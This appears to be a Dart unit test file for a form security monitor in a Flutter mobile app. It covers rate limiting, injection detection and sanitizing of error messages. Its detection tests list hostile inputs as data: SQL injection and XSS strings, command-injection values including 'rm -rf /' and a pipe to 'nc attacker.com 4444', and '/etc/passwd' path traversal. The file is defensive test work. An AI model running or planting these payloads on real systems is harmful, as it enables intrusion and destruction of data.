import 'package:flutter_test/flutter_test.dart';
import 'package:agrinova_mobile/features/gate_check/presentation/utils/form_security_monitor.dart';

void main() {
  group('FormSecurityMonitor', () {
    setUp(() {
      FormSecurityMonitor.clearMonitoringData();
    });

    group('Submission Monitoring', () {
      test('should allow normal submission rate', () {
        const userId = 'test_user';
        const formType = 'guest_registration';

        // Should allow up to maxSubmissionAttemptsPerMinute
        for (int i = 0; i < 5; i++) {
          expect(
            FormSecurityMonitor.monitorSubmissionAttempt(userId, formType),
            true,
            reason: 'Submission $i should be allowed',
          );
        }
      });

      test('should block excessive submission attempts', () {
        const userId = 'test_user';
        const formType = 'guest_registration';

        // Fill up the allowed attempts
        for (int i = 0; i < 10; i++) {
          FormSecurityMonitor.monitorSubmissionAttempt(userId, formType);
        }

        // Next attempt should be blocked
        expect(
          FormSecurityMonitor.monitorSubmissionAttempt(userId, formType),
          false,
          reason: 'Excessive submission attempts should be blocked',
        );
      });

      test('should allow different users independently', () {
        const formType = 'guest_registration';

        // Fill up attempts for user1
        for (int i = 0; i < 10; i++) {
          FormSecurityMonitor.monitorSubmissionAttempt('user1', formType);
        }

        // user2 should still be allowed
        expect(
          FormSecurityMonitor.monitorSubmissionAttempt('user2', formType),
          true,
          reason: 'Different users should have independent rate limits',
        );
      });
    });

    group('Injection Detection', () {
      test('should detect SQL injection attempts', () {
        const sqlInjections = [
          'SELECT * FROM users',
          'UNION SELECT password FROM users',
          'INSERT INTO table VALUES',
          'DELETE FROM users WHERE',
          'UPDATE users SET password',
        ];

        for (final injection in sqlInjections) {
          expect(
            FormSecurityMonitor.detectInjectionAttempt(injection, 'test_field'),
            true,
            reason: 'Should detect SQL injection: $injection',
          );
        }
      });

      test('should detect XSS attempts', () {
        const xssAttempts = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '<img onerror="alert(1)" src="x">',
          '<div onclick="malicious()">',
        ];

        for (final xss in xssAttempts) {
          expect(
            FormSecurityMonitor.detectInjectionAttempt(xss, 'test_field'),
            true,
            reason: 'Should detect XSS attempt: $xss',
          );
        }
      });

      test('should detect command injection attempts', () {
        const commandInjections = [
          'test; rm -rf /',
          'test && malicious_command',
          'test | nc attacker.com 4444',
          'test `whoami`',
          'test \$USER',
        ];

        for (final injection in commandInjections) {
          expect(
            FormSecurityMonitor.detectInjectionAttempt(injection, 'test_field'),
            true,
            reason: 'Should detect command injection: $injection',
          );
        }
      });

      test('should allow safe input', () {
        const safeInputs = [
          'John Doe',
          'B 1234 ABC',
          'PT. Agrinova Indonesia',
          'Kelapa Sawit',
          'Perkebunan Sawit Indah',
          'Normal description text',
        ];

        for (final input in safeInputs) {
          expect(
            FormSecurityMonitor.detectInjectionAttempt(input, 'test_field'),
            false,
            reason: 'Should allow safe input: $input',
          );
        }
      });

      test('should detect path traversal attempts', () {
        const pathTraversals = [
          '../../../etc/passwd',
          '..\\..\\windows\\system32',
          '../config.json',
        ];

        for (final traversal in pathTraversals) {
          expect(
            FormSecurityMonitor.detectInjectionAttempt(traversal, 'test_field'),
            true,
            reason: 'Should detect path traversal: $traversal',
          );
        }
      });
    });

    group('Validation Failure Monitoring', () {
      test('should monitor validation failures', () {
        const userId = 'test_user';
        const fieldName = 'test_field';

        // Monitor multiple failures
        for (int i = 0; i < 5; i++) {
          FormSecurityMonitor.monitorValidationFailure(userId, fieldName, 'INVALID_FORMAT');
        }

        // Should not throw exception
        expect(() {
          FormSecurityMonitor.monitorValidationFailure(userId, fieldName, 'INVALID_FORMAT');
        }, returnsNormally);
      });

      test('should track excessive validation failures', () {
        const userId = 'test_user';
        const fieldName = 'test_field';

        // Monitor excessive failures (this should trigger warning in logs)
        for (int i = 0; i < 25; i++) {
          FormSecurityMonitor.monitorValidationFailure(userId, fieldName, 'INVALID_FORMAT');
        }

        // Should not crash or throw
        expect(() {
          FormSecurityMonitor.monitorValidationFailure(userId, fieldName, 'INVALID_FORMAT');
        }, returnsNormally);
      });
    });

    group('Security Statistics', () {
      test('should provide security statistics', () {
        // Generate some activity
        FormSecurityMonitor.monitorSubmissionAttempt('user1', 'form1');
        FormSecurityMonitor.monitorSubmissionAttempt('user2', 'form2');
        FormSecurityMonitor.monitorValidationFailure('user1', 'field1', 'ERROR');

        final stats = FormSecurityMonitor.getSecurityStatistics();

        expect(stats, isA<Map<String, dynamic>>());
        expect(stats['activeUsers'], greaterThan(0));
        expect(stats['totalAttempts'], greaterThan(0));
        expect(stats['timestamp'], isNotNull);
      });
    });
  });

  group('SecureErrorMessageUtil', () {
    test('should return safe error messages', () {
      const testCases = {
        'INVALID_INPUT': 'Input tidak valid. Harap periksa format data.',
        'RATE_LIMITED': 'Terlalu banyak percobaan. Tunggu beberapa saat.',
        'NETWORK_ERROR': 'Koneksi bermasalah. Periksa jaringan Anda.',
        'UNAUTHORIZED': 'Anda tidak memiliki izin untuk operasi ini.',
      };

      for (final entry in testCases.entries) {
        final message = SecureErrorMessageUtil.getSafeErrorMessage(entry.key);
        expect(message, equals(entry.value));
      }
    });

    test('should handle unknown error codes', () {
      const message = SecureErrorMessageUtil.getSafeErrorMessage('UNKNOWN_ERROR');
      expect(message, equals('Terjadi kesalahan yang tidak diketahui.'));
    });

    test('should include context when provided', () {
      const message = SecureErrorMessageUtil.getSafeErrorMessage(
        'INVALID_INPUT',
        context: 'vehicle_plate',
      );
      expect(message, contains('Context: vehicle_plate'));
    });

    test('should sanitize sensitive information', () {
      const testCases = {
        'Error: password=secret123 failed': 'Error: [REDACTED] failed',
        'Token abc123def expired': '[REDACTED] expired',
        'Key mykey123 not found': '[REDACTED] not found',
        'Path /home/user/secrets.txt': 'Path [PATH] secrets.txt',
        'IP 192.168.1.1 unreachable': 'IP [IP]  unreachable',
      };

      for (final entry in testCases.entries) {
        final sanitized = SecureErrorMessageUtil.sanitizeErrorMessage(entry.key);
        expect(sanitized, contains('[REDACTED]') || contains('[PATH]') || contains('[IP]'));
      }
    });

    test('should truncate long error messages', () {
      final longError = 'Error: ' + 'x' * 300;
      final sanitized = SecureErrorMessageUtil.sanitizeErrorMessage(longError);
      expect(sanitized.length, lessThanOrEqualTo(203)); // 200 + "..."
      expect(sanitized, endsWith('...'));
    });
  });
}